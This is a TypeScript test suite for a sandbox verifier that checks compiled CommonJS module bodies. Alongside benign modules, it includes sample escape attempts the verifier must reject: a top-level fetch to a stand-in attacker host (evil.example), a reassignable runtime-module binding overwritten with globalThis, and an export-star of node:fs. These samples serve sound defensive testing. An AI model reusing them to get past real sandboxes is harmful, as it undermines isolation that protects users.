import { describe, it } from "@std/testing/bdd";
import { expect } from "@std/expect";

import { compileSourcesToRecords } from "../src/sandbox/module-record-compiler.ts";
import { verifyCompiledModuleBody } from "../src/sandbox/module-record-verifier.ts";
import { ensureCompilerStack } from "../src/harness/deferred-compiler-stack.ts";

// These tests drive the sync transpile/record internals directly (below the
// async flow boundaries that normally load the deferred compiler stack).
await ensureCompilerStack();

// The verifier front-end classifies each module's compiled-CommonJS body. That
// body carries a `const x = require("...")` import preamble which the front-end
// must recognize (seeding env with import bindings) before handing the rest to
// the shared classifyModuleItems core.

function compiledBody(files: Record<string, string>, path: string): string {
  const sources = Object.entries(files).map(([name, contents]) => ({
    name,
    contents,
  }));
  const { specifierByPath, compiledBodies } = compileSourcesToRecords(sources, {
    runtimeModules: { commonfabric: ["pattern", "lift", "handler", "derive"] },
  });
  return compiledBodies.get(specifierByPath.get(path)!)!;
}

describe("verifyCompiledModuleBody", () => {
  it("accepts a benign multi-import pattern module", () => {
    const body = compiledBody({
      "/util.ts": `export const dbl = (x: number): number => x * 2;`,
      "/main.tsx":
        `import { dbl } from "./util.ts";\nimport { pattern, lift } from "commonfabric";\nexport const helper = (x: number) => dbl(x);\nexport const v = pattern((s: { n: number }) => ({ d: lift((c: number) => dbl(c))(s.n) }));\nexport default v;\n`,
    }, "/main.tsx");
    expect(() => verifyCompiledModuleBody(body, "/main.tsx")).not.toThrow();
  });

  it("accepts a module with a default import (inline __importDefault helper)", () => {
    // Default imports make the compiler emit an inline `var __importDefault =
    // …` helper; the verifier must allow that canonical declaration.
    const body = compiledBody({
      "/dep.ts": `const v = 7;\nexport default v;`,
      "/main.ts":
        `import dep from "./dep.ts";\nexport const run = (): number => dep + 1;`,
    }, "/main.ts");
    expect(body).toContain("__importDefault"); // sanity: the helper is present
    expect(() => verifyCompiledModuleBody(body, "/main.ts")).not.toThrow();
  });

  it("accepts an `export * from` module (export-star require form)", () => {
    const body = compiledBody({
      "/inner.ts": `export const a = (): number => 1;`,
      "/main.ts":
        `export * from "./inner.ts";\nexport const own = (): number => 2;`,
    }, "/main.ts");
    expect(body).toContain("__exportStar(require("); // sanity
    expect(() => verifyCompiledModuleBody(body, "/main.ts")).not.toThrow();
  });

  it("accepts a named re-export (`export { x } from` — var require preamble)", () => {
    // TypeScript's CommonJS emit declares the module reference for a
    // named re-export with `var` (hoisted ahead of the live getter), unlike the
    // `const` of a plain import. The import-preamble fast-path must accept the
    // `var` form so the re-export verifies instead of failing SES at runtime.
    const body = compiledBody({
      "/sibling.ts": `export const thatConst = (): number => 42;`,
      "/main.ts":
        `export { thatConst } from "./sibling.ts";\nexport const own = (): number => 2;`,
    }, "/main.ts");
    expect(body).toMatch(/var \w+ = require\(/); // sanity: TS emits `var`
    expect(body).toContain('Object.defineProperty(exports, "thatConst"'); // getter
    expect(() => verifyCompiledModuleBody(body, "/main.ts")).not.toThrow();
  });

  it("still rejects a non-import top-level `var` binding", () => {
    // The `var` relaxation is scoped to the `= require(...)` import preamble.
    // A plain mutable top-level binding must remain a SES violation.
    const body =
      `Object.defineProperty(exports, "__esModule", { value: true });\nvar leaked = 7;`;
    expect(() => verifyCompiledModuleBody(body, "/main.ts")).toThrow(
      /mutable bindings/,
    );
  });

  it("rejects a `var` require of a trusted runtime module", () => {
    // The `var` relaxation must not extend to trusted runtime bindings. A
    // `var` binding is mutable at runtime (only a `const` throws on
    // reassignment), and the verifier does not inspect trusted builder-callback
    // bodies — so a `var cf = require("commonfabric")` could be reassigned to
    // attacker code from inside a callback yet still pass trusted-builder
    // classification. Runtime imports must stay `const`.
    const body = `var cf = require("commonfabric");\n` +
      `const v = (0, cf.pattern)((s) => { cf = globalThis; return s; });\n` +
      `exports.v = v;`;
    expect(() => verifyCompiledModuleBody(body, "/main.ts")).toThrow(
      /mutable bindings/,
    );
  });

  it("rejects reassignment of a var import binding", () => {
    // Safety guard for the `var` relaxation: accepting `var x = require(...)`
    // relies on any later reassignment being independently rejected. A bare
    // top-level assignment is not a recognized item, so it must throw.
    const body =
      `Object.defineProperty(exports, "__esModule", { value: true });\n` +
      `var m = require("./sibling.ts");\nm = globalThis;`;
    expect(() => verifyCompiledModuleBody(body, "/main.ts")).toThrow();
  });

  it("rejects export-star require of a disallowed specifier", () => {
    // Hand-built body: __exportStar from a non-local, non-runtime specifier.
    const body =
      `Object.defineProperty(exports, "__esModule", { value: true });\n__exportStar(require("node:fs"), exports);`;
    expect(() => verifyCompiledModuleBody(body, "/main.ts")).toThrow();
  });

  it("accepts the imported leaf module", () => {
    const body = compiledBody({
      "/util.ts": `export const dbl = (x: number): number => x * 2;`,
    }, "/util.ts");
    expect(() => verifyCompiledModuleBody(body, "/util.ts")).not.toThrow();
  });

  it("rejects unwrapped mutable top-level data", () => {
    const body = compiledBody({
      "/main.ts": `export const config = { a: 1, b: 2 };`,
    }, "/main.ts");
    expect(() => verifyCompiledModuleBody(body, "/main.ts")).toThrow(
      /__cf_data/,
    );
  });

  it("rejects a top-level call result that is not a trusted builder/data", () => {
    const body = compiledBody({
      "/main.ts":
        `const leaked = fetch("https://evil.example");\nexport const x = 1;\n`,
    }, "/main.ts");
    expect(() => verifyCompiledModuleBody(body, "/main.ts")).toThrow();
  });

  it("accepts a module with several regex literals", () => {
    // The scanner classifies each `/` as a regex start or a division operator
    // based on the previous token. Whitespace between a regex-prefix keyword
    // (e.g. `return`) and the regex must stay transparent to that decision —
    // otherwise the opening `/` is read as division and a later `/` (after a
    // `+` quantifier or `]` class close that re-allows a regex) is mistaken for
    // a regex start, running the closing-`/` scan off the end of the module.
    const body = compiledBody({
      "/regexes.ts": `export function anchored(s: string): boolean {\n` +
        `  return /^#[\\p{L}\\p{M}\\p{Nd}_]+/u.test(s);\n` +
        `}\n` +
        `export function global(s: string): string[] {\n` +
        `  return s.match(/#[\\p{L}\\p{M}\\p{Nd}_]+/gu) ?? [];\n` +
        `}\n` +
        `export function charClass(s: string): boolean {\n` +
        `  return /[a-z0-9]+/u.test(s);\n` +
        `}\n` +
        `export function escapedSlash(s: string): boolean {\n` +
        `  return /a\\/b/u.test(s);\n` +
        `}\n`,
    }, "/regexes.ts");
    expect(() => verifyCompiledModuleBody(body, "/regexes.ts")).not.toThrow();
  });

  it("classifies real division as an operator with whitespace transparent", () => {
    // Making whitespace transparent must not turn a genuine division operator
    // into a regex. A module that only divides should verify (the `/` is an
    // operator, never a literal).
    const body = compiledBody({
      "/division.ts":
        `export function ratio(x: number, y: number): number {\n` +
        `  return x / y / 2;\n` +
        `}\n` +
        `export function half(x: number): number {\n` +
        `  return (x + 1) / 2;\n` +
        `}\n`,
    }, "/division.ts");
    expect(() => verifyCompiledModuleBody(body, "/division.ts")).not.toThrow();
  });
});
